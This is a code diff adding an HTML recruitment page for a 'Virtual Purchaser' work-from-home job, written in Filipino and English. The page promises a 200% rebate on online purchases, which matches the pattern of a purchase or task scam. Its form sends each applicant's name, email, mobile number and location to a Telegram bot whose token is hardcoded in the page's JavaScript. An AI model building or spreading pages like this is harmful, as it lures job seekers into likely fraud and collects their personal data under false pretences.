@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Virtual Purchaser - Digital Earnings Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        body { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .tab-active { @apply bg-blue-600 text-white shadow-lg shadow-blue-500/30 scale-105; }
+        .tab-inactive { @apply bg-slate-100 text-slate-600 hover:bg-slate-200; }
+        .glass-container {
+            background: rgba(255, 255, 255, 0.94);
+            backdrop-filter: blur(16px);
+        }
+        /* Success Modal Overlay */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            padding: 1.5rem;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: white;
+            max-width: 480px;
+            width: 100%;
+            border-radius: 32px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
+            animation: modalPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-align: center;
+        }
+        @keyframes modalPop {
+            0% { transform: scale(0.8) translateY(20px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+        .modal-box .check-circle {
+            width: 72px;
+            height: 72px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.2rem;
+            color: white;
+            margin: 0 auto 1rem;
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
+        }
+        .modal-box h3 {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #0f172a;
+        }
+        .modal-box p {
+            color: #475569;
+            font-size: 0.95rem;
+            margin-top: 0.5rem;
+            line-height: 1.6;
+        }
+        .modal-box .btn-close-modal {
+            margin-top: 1.5rem;
+            padding: 0.8rem 2.5rem;
+            background: #1e40af;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .modal-box .btn-close-modal:hover {
+            background: #1e3a8a;
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-slate-900 via-indigo-950 to-slate-900 min-h-screen py-6 px-4 md:py-12">
+
+    <!-- ===== SUCCESS MODAL ===== -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-box">
+            <div class="check-circle">
+                <i class="fa-solid fa-check"></i>
+            </div>
+            <h3>🎉 Application Submitted!</h3>
+            <p>
+                Thank you for applying to become a Virtual Purchaser!<br />
+                Our onboarding team will review your details and reach out via Email / SMS with the next steps.
+            </p>
+            <button class="btn-close-modal" onclick="closeModal()">
+                Got it! <i class="fa-solid fa-arrow-right ml-2"></i>
+            </button>
+        </div>
+    </div>
+
+    <main class="max-w-4xl mx-auto glass-container rounded-3xl shadow-2xl border border-white/20 overflow-hidden transition-all duration-300">
+        
+        <header class="p-6 md:p-8 bg-slate-900/90 text-white border-b border-slate-800">
+            <div class="flex flex-col md:flex-row justify-between items-center gap-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-12 h-12 rounded-2xl bg-blue-600 flex items-center justify-center text-xl font-bold shadow-lg shadow-blue-500/40">
+                        VP
+                    </div>
+                    <div>
+                        <span class="text-xs font-bold tracking-widest text-blue-400 uppercase">Career Opportunity</span>
+                        <h1 class="text-2xl font-extrabold tracking-tight">VIRTUAL PURCHASER</h1>
+                    </div>
+                </div>
+
+                <nav class="flex p-1.5 bg-slate-800/80 rounded-2xl border border-slate-700/50 w-full md:w-auto">
+                    <button id="portal-about-btn" onclick="switchPortal('about')" 
+                        class="flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-active">
+                        <i class="fa-solid font-bold fa-circle-info"></i> Portal 1: About Us
+                    </button>
+                    <button id="portal-apply-btn" onclick="switchPortal('apply')" 
+                        class="flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-inactive">
+                        <i class="fa-solid font-bold fa-paper-plane"></i> Portal 2: Apply Now
+                    </button>
+                </nav>
+            </div>
+        </header>
+
+        <!-- ===== PORTAL 1: ABOUT ===== -->
+        <section id="portal-about" class="p-6 md:p-10 space-y-10 block">
+            
+            <div class="text-center space-y-4 max-w-2xl mx-auto pt-2">
+                <span class="inline-block px-4 py-1.5 rounded-full bg-blue-100 text-blue-700 text-xs font-bold uppercase tracking-wide">
+                    Digital Marketplace Economy
+                </span>
+                <h2 class="text-3xl md:text-4xl font-extrabold text-slate-900 leading-tight">
+                    Enter the World of Online Purchasing & Virtual Earnings
+                </h2>
+                <p class="text-slate-600 text-base md:text-lg leading-relaxed">
+                    What if shopping online could become more than just spending money? In the digital world, transactions create new opportunities for virtual rewards and daily earnings.
+                </p>
+            </div>
+
+            <div class="space-y-4">
+                <div class="text-center md:text-left">
+                    <h3 class="text-xl font-extrabold text-slate-900 tracking-tight">ANO ANG VIRTUAL PURCHASER?</h3>
+                    <p class="text-xs text-slate-500">Ang tatlong pangunahing tungkulin sa digital purchasing portal:</p>
+                </div>
+
+                <div class="grid md:grid-cols-3 gap-4">
+                    <div class="p-5 rounded-2xl bg-slate-50 border border-slate-200/80 hover:border-blue-300 transition-all space-y-3 relative overflow-hidden group">
+                        <div class="w-10 h-10 rounded-xl bg-blue-100 text-blue-600 flex items-center justify-center font-bold text-lg">
+                            <i class="fa-solid fa-cart-shopping"></i>
+                        </div>
+                        <h4 class="font-bold text-slate-900 text-sm">1. Process Purchases</h4>
+                        <p class="text-xs text-slate-600 leading-relaxed">
+                            Gumagamit ng approved digital payment methods para mag-process ng mga kwalipikadong online orders sa e-commerce system.
+                        </p>
+                    </div>
+
+                    <div class="p-5 rounded-2xl bg-slate-50 border border-slate-200/80 hover:border-blue-300 transition-all space-y-3 relative overflow-hidden group">
+                        <div class="w-10 h-10 rounded-xl bg-indigo-100 text-indigo-600 flex items-center justify-center font-bold text-lg">
+                            <i class="fa-solid fa-arrows-rotate"></i>
+                        </div>
+                        <h4 class="font-bold text-slate-900 text-sm">2. Generate Rewards</h4>
+                        <p class="text-xs text-slate-600 leading-relaxed">
+                            Bawat matagumpay na transaksyon ay nagse-set off ng promotional rebates, cashback, o system virtual credits.
+                        </p>
+                    </div>
+
+                    <div class="p-5 rounded-2xl bg-slate-50 border border-slate-200/80 hover:border-blue-300 transition-all space-y-3 relative overflow-hidden group">
+                        <div class="w-10 h-10 rounded-xl bg-emerald-100 text-emerald-600 flex items-center justify-center font-bold text-lg">
+                            <i class="fa-solid fa-wallet"></i>
+                        </div>
+                        <h4 class="font-bold text-slate-900 text-sm">3. Earn Profits</h4>
+                        <p class="text-xs text-slate-600 leading-relaxed">
+                            Ang nakuhang cashback at virtual rewards ay naiipon bilang pwedeng i-withdraw na kita o commission base sa program rules.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-6 md:p-8 rounded-3xl bg-slate-900 text-white space-y-8 shadow-xl">
+                <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-2 border-b border-slate-800 pb-4">
+                    <div>
+                        <span class="text-xs font-bold text-emerald-400 uppercase tracking-widest">Earnings Breakdown</span>
+                        <h3 class="text-2xl font-extrabold text-white">PAANO KUMITA ANG VIRTUAL PURCHASER?</h3>
+                    </div>
+                    <span class="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold">
+                        <i class="fa-solid fa-bolt mr-1"></i> Transaction-Based Profit
+                    </span>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <div class="p-4 rounded-2xl bg-slate-800/80 border border-slate-700/60 space-y-2">
+                        <div class="flex items-center justify-between text-xs font-bold text-slate-400">
+                            <span>HAKBANG 01</span>
+                            <i class="fa-solid fa-list-check text-blue-400"></i>
+                        </div>
+                        <h4 class="font-bold text-sm text-white">Tanggapin ang Order</h4>
+                        <p class="text-xs text-slate-400">Pumili ng approved purchasing task sa platform system.</p>
+                    </div>
+
+                    <div class="p-4 rounded-2xl bg-slate-800/80 border border-slate-700/60 space-y-2">
+                        <div class="flex items-center justify-between text-xs font-bold text-slate-400">
+                            <span>HAKBANG 02</span>
+                            <i class="fa-solid fa-credit-card text-indigo-400"></i>
+                        </div>
+                        <h4 class="font-bold text-sm text-white">I-process ang Transaction</h4>
+                        <p class="text-xs text-slate-400">Gamitin ang approved online payment channels para mabayaran ang item.</p>
+                    </div>
+
+                    <div class="p-4 rounded-2xl bg-slate-800/80 border border-slate-700/60 space-y-2">
+                        <div class="flex items-center justify-between text-xs font-bold text-slate-400">
+                            <span>HAKBANG 03</span>
+                            <i class="fa-solid fa-percent text-emerald-400"></i>
+                        </div>
+                        <h4 class="font-bold text-sm text-white">Receive Rebate / Cash</h4>
+                        <p class="text-xs text-slate-400">Awtomatikong mag-co-compute ang system ng cashback rate para sa order.</p>
+                    </div>
+
+                    <div class="p-4 rounded-2xl bg-slate-800/80 border border-slate-700/60 space-y-2">
+                        <div class="flex items-center justify-between text-xs font-bold text-slate-400">
+                            <span>HAKBANG 04</span>
+                            <i class="fa-solid fa-money-bill-trend-up text-amber-400"></i>
+                        </div>
+                        <h4 class="font-bold text-sm text-white">I-withdraw ang Kita</h4>
+                        <p class="text-xs text-slate-400">I-transfer ang virtual earnings at cashback direkta sa iyong account.</p>
+                    </div>
+                </div>
+
+                <div class="p-6 rounded-2xl bg-gradient-to-r from-blue-900/50 via-indigo-900/50 to-slate-800 border border-blue-500/30 space-y-4">
+                    <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2">
+                        <h4 class="font-extrabold text-sm text-blue-200 uppercase tracking-wide">Halimbawa ng Promotional Earn Scenario</h4>
+                        <span class="text-xs font-bold bg-blue-500 text-white px-2.5 py-1 rounded-md">Sample Rate: 200% Virtual Value</span>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-center items-center py-2">
+                        <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-700">
+                            <span class="text-xs text-slate-400 font-semibold uppercase block">Transaction Value</span>
+                            <span class="text-xl font-extrabold text-white">₱1,000</span>
+                        </div>
+                        
+                        <div class="flex items-center justify-center gap-2 text-blue-400 font-bold">
+                            <i class="fa-solid fa-plus text-xs"></i>
+                            <span class="text-sm">200% Rebate / Bonus</span>
+                            <i class="fa-solid fa-equals text-xs"></i>
+                        </div>
+
+                        <div class="bg-emerald-500/20 p-4 rounded-xl border border-emerald-500/40 text-emerald-300">
+                            <span class="text-xs text-emerald-200 font-semibold uppercase block">Potential Virtual Reward</span>
+                            <span class="text-2xl font-black text-emerald-400">₱2,000</span>
+                        </div>
+                    </div>
+
+                    <p class="text-[11px] text-slate-400 text-center italic">
+                        Ipinapakita nito kung paano nagiging mas mataas ang virtual reward value kumpara sa orihinal na transaksyon kapag may mataas na promotional rebate rate.
+                    </p>
+                </div>
+            </div>
+
+            <div class="space-y-6">
+                <h3 class="text-xl font-bold text-slate-900">WHY BECOME A VIRTUAL PURCHASER?</h3>
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-house-laptop"></i> Work From Home</div>
+                        <p class="text-xs text-slate-600">No need to spend your day commuting. Perform activities through an internet-connected device from home.</p>
+                    </div>
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-clock"></i> Flexible Working Hours</div>
+                        <p class="text-xs text-slate-600">Have control over your schedule. Work during the hours that fit your routine based on operating rules.</p>
+                    </div>
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-globe"></i> Digital Marketplace Skill</div>
+                        <p class="text-xs text-slate-600">Learn how modern online purchasing, e-wallets, digital payments, and virtual reward systems work.</p>
+                    </div>
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-mobile-screen"></i> Accessible Tools</div>
+                        <p class="text-xs text-slate-600">Your smartphone, computer, and reliable internet connection become your main everyday work tools.</p>
+                    </div>
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-gift"></i> Virtual Rewards</div>
+                        <p class="text-xs text-slate-600">Eligible transactions may provide cashback, rebates, or promotional virtual earnings depending on terms.</p>
+                    </div>
+                    <div class="p-5 rounded-2xl border border-slate-200 hover:border-blue-400 transition-all bg-white shadow-sm space-y-2">
+                        <div class="text-blue-600 text-lg font-bold"><i class="fa-solid fa-rocket"></i> Easy To Get Started</div>
+                        <p class="text-xs text-slate-600">No extensive experience required. All you need is a willingness to learn and follow purchasing steps.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-6 bg-slate-900 text-white rounded-2xl space-y-4">
+                <h3 class="text-lg font-bold text-blue-400">IMAGINE YOUR NEW WORK ENVIRONMENT</h3>
+                <div class="grid md:grid-cols-2 gap-4 text-xs">
+                    <div class="p-4 bg-slate-800/60 rounded-xl border border-slate-700/50">
+                        <span class="text-slate-400 font-bold block mb-2">Old Routine:</span>
+                        Wake up → Commute → Office → 8-hour shift → Commute home
+                    </div>
+                    <div class="p-4 bg-blue-900/40 rounded-xl border border-blue-500/40 text-blue-100">
+                        <span class="text-blue-300 font-bold block mb-2">Your New Routine:</span>
+                        Wake up → Open device → Connect online → Process tasks → Manage schedule
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-4">
+                <h3 class="text-xl font-bold text-slate-900">WHO CAN BECOME A VIRTUAL PURCHASER?</h3>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-sm text-slate-700 font-medium">
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Prefer working from home</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Want flexible working hours</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Comfortable using smartphone/PC</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Interested in e-commerce</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Willing to learn digital payments</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Can follow instructions carefully</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Have reliable internet connection</div>
+                    <div class="p-3 bg-slate-50 rounded-xl border border-slate-100 flex items-center gap-2"><i class="fa-solid fa-circle-check text-emerald-500"></i> Ready to discover new tools</div>
+                </div>
+            </div>
+
+            <div class="p-8 text-center bg-gradient-to-r from-blue-600 to-indigo-600 rounded-3xl text-white space-y-4">
+                <h3 class="text-2xl font-bold">READY TO ENTER THE VIRTUAL WORLD?</h3>
+                <p class="text-sm text-blue-100 max-w-xl mx-auto">
+                    Become part of the Virtual Purchasing environment and discover how online transactions, digital payments, cashback, rebates, and virtual rewards can work together.
+                </p>
+                <button onclick="switchPortal('apply')" class="px-8 py-3.5 bg-white text-blue-600 font-extrabold rounded-2xl shadow-xl hover:bg-slate-100 transition-all transform hover:-translate-y-0.5">
+                    START YOUR VIRTUAL PURCHASER JOURNEY TODAY
+                </button>
+            </div>
+
+            <div class="p-4 bg-slate-100 rounded-2xl text-xs text-slate-500 space-y-1">
+                <span class="font-bold text-slate-700 block uppercase">Transparency Notice</span>
+                <p>Virtual earnings, cashback, rebates, and promotional rewards are not guaranteed income. Any percentage shown, including the 200% example, represents a promotional/example scenario and is subject to the actual program rules, eligibility requirements, transaction conditions, limits, and applicable terms.</p>
+            </div>
+        </section>
+
+        <!-- ===== PORTAL 2: APPLY ===== -->
+        <section id="portal-apply" class="p-6 md:p-10 space-y-8 hidden">
+            
+            <div class="border-b pb-4">
+                <span class="text-xs font-bold text-blue-600 uppercase tracking-widest">Onboarding Form</span>
+                <h2 class="text-2xl font-extrabold text-slate-900">Virtual Purchaser Application</h2>
+                <p class="text-sm text-slate-500 mt-1">Complete your application details below to get started.</p>
+            </div>
+
+            <form id="applicant-form" onsubmit="handleFormSubmit(event)" class="space-y-6">
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Full Name</label>
+                        <input type="text" id="fullName" required placeholder="John Doe" 
+                            class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm">
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Email Address</label>
+                        <input type="email" id="email" required placeholder="john@example.com" 
+                            class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm">
+                    </div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Mobile Number</label>
+                        <input type="tel" id="mobile" required placeholder="09123456789" 
+                            class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm">
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Current Location / Province</label>
+                        <input type="text" id="location" required placeholder="e.g. Cebu, Metro Manila" 
+                            class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm">
+                    </div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Primary Work Device</label>
+                        <select id="device" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm bg-white">
+                            <option value="">Select Primary Device</option>
+                            <option value="smartphone">Smartphone (Android/iOS)</option>
+                            <option value="laptop">Laptop Computer</option>
+                            <option value="desktop">Desktop PC</option>
+                            <option value="both">Both Smartphone & PC</option>
+                        </select>
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-xs font-bold text-slate-700 uppercase">Internet Connection</label>
+                        <select id="internet" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm bg-white">
+                            <option value="">Select Connection Type</option>
+                            <option value="fiber">Fiber / High-Speed Broadband</option>
+                            <option value="4g5g">4G / 5G Mobile Data</option>
+                            <option value="wifi">Shared Wi-Fi</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="space-y-1">
+                    <label class="text-xs font-bold text-slate-700 uppercase">Why do you want to become a Virtual Purchaser?</label>
+                    <textarea id="reason" rows="3" placeholder="Briefly describe your interest in working online..." 
+                        class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm"></textarea>
+                </div>
+
+                <button type="submit" id="submitBtn" class="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-extrabold rounded-2xl shadow-xl shadow-blue-500/30 transition-all text-base">
+                    <i class="fa-solid fa-paper-plane mr-2"></i> SUBMIT APPLICATION
+                </button>
+            </form>
+
+            <div id="form-success" class="hidden p-8 text-center bg-emerald-50 border border-emerald-200 rounded-2xl space-y-3">
+                <div class="w-12 h-12 bg-emerald-500 text-white rounded-full flex items-center justify-center mx-auto text-xl">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+                <h3 class="text-xl font-bold text-emerald-900">Application Received!</h3>
+                <p class="text-xs text-emerald-700 max-w-md mx-auto">
+                    Thank you for applying. Our onboarding team will review your details and reach out via Email/SMS with the next steps.
+                </p>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // ===== TAB SWITCHING =====
+        function switchPortal(portalName) {
+            const aboutPortal = document.getElementById('portal-about');
+            const applyPortal = document.getElementById('portal-apply');
+            const aboutBtn = document.getElementById('portal-about-btn');
+            const applyBtn = document.getElementById('portal-apply-btn');
+
+            if (portalName === 'about') {
+                aboutPortal.classList.remove('hidden');
+                applyPortal.classList.add('hidden');
+                aboutBtn.className = "flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-active";
+                applyBtn.className = "flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-inactive";
+            } else {
+                aboutPortal.classList.add('hidden');
+                applyPortal.classList.remove('hidden');
+                applyBtn.className = "flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-active";
+                aboutBtn.className = "flex-1 md:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all duration-300 flex items-center justify-center gap-2 tab-inactive";
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ===== TELEGRAM NOTIFICATION =====
+        function sendTelegramNotification(data) {
+            const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+            const chatId = '7298607329';
+
+            const timestamp = new Date().toLocaleString('en-PH', {
+                timeZone: 'Asia/Manila',
+                month: 'long',
+                day: 'numeric',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            const message = `
+📋 <b>New Virtual Purchaser Application</b>
+
+👤 <b>Name:</b> ${data.fullName}
+📧 <b>Email:</b> ${data.email}
+📱 <b>Mobile:</b> ${data.mobile}
+📍 <b>Location:</b> ${data.location}
+💻 <b>Device:</b> ${data.device}
+🌐 <b>Internet:</b> ${data.internet}
+📝 <b>Reason:</b> ${data.reason || 'N/A'}
+
+📅 ${timestamp}
+            `;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const params = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            const queryString = Object.keys(params)
+                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+                .join('&');
+
+            fetch(`${url}?${queryString}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Telegram error:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Failed to send Telegram notification:', error);
+                });
+        }
+
+        // ===== MODAL CONTROLS =====
+        function showModal() {
+            document.getElementById('successModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('successModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal on overlay click
+        document.getElementById('successModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        // ===== FORM HANDLER =====
+        function handleFormSubmit(e) {
+            e.preventDefault();
+
+            // Gather form data
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const mobile = document.getElementById('mobile').value.trim();
+            const location = document.getElementById('location').value.trim();
+            const device = document.getElementById('device').value;
+            const internet = document.getElementById('internet').value;
+            const reason = document.getElementById('reason').value.trim();
+
+            // Basic validation
+            if (!fullName || !email || !mobile || !location || !device || !internet) {
+                alert('❗ Please fill in all required fields.');
+                return;
+            }
+
+            // Mobile validation
+            const mobileDigits = mobile.replace(/\D/g, '');
+            if (mobileDigits.length !== 11 || !mobileDigits.startsWith('09')) {
+                alert('❗ Please enter a valid 11-digit mobile number starting with 09.');
+                return;
+            }
+
+            // Email validation (simple)
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('❗ Please enter a valid email address.');
+                return;
+            }
+
+            const formData = {
+                fullName,
+                email,
+                mobile: mobileDigits,
+                location,
+                device,
+                internet,
+                reason: reason || 'N/A'
+            };
+
+            // Send Telegram notification
+            sendTelegramNotification(formData);
+
+            // Show success modal
+            showModal();
+
+            // Reset form
+            document.getElementById('applicant-form').reset();
+        }
+
+        // ===== MOBILE INPUT FORMATTING =====
+        document.getElementById('mobile').addEventListener('input', function() {
+            let digits = this.value.replace(/\D/g, '');
+            if (digits.length > 11) digits = digits.slice(0, 11);
+            this.value = digits;
+        });
+    </script>
+
+</body>
+</html>
